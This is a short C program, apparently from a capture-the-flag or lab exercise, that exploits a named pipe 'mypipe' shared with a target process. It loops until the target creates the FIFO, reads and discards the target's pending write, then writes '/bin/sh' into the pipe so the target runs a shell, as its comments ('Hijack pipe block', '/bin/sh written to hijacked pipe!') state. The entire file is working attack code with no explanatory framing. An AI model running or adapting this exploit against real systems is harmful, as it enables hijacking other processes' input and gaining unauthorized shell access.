#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

#define MAX_BUF 5
#define CMD_LEN 7
int main()
{
    int fd; // File descriptors
    char *namedPipe = "mypipe"; // FIFO Pipe
    char pipeCmd[CMD_LEN] = "/bin/sh"; // Command to send to pipe;
    char buf[7];

    printf("Waiting for namedpipe to be created by target...\n");

    while (1)
    {
        fd = open(namedPipe, O_RDONLY); // Hijack pipe block
        if (fd == -1)
            continue; //Keep looping
        break;
    }
    printf("Opening pipe in read mode - blocking until next write...\n");
    read(fd, buf, CMD_LEN); // Eat pipe contents
    close(fd);

    printf("Opening pipe in write mode - blocking until next read...\n");
    fd = open(namedPipe, O_WRONLY); // write only
    write(fd, pipeCmd, CMD_LEN); // write cmd
    printf("/bin/sh written to hijacked pipe!\n");
    close(fd);

    return 0;
}
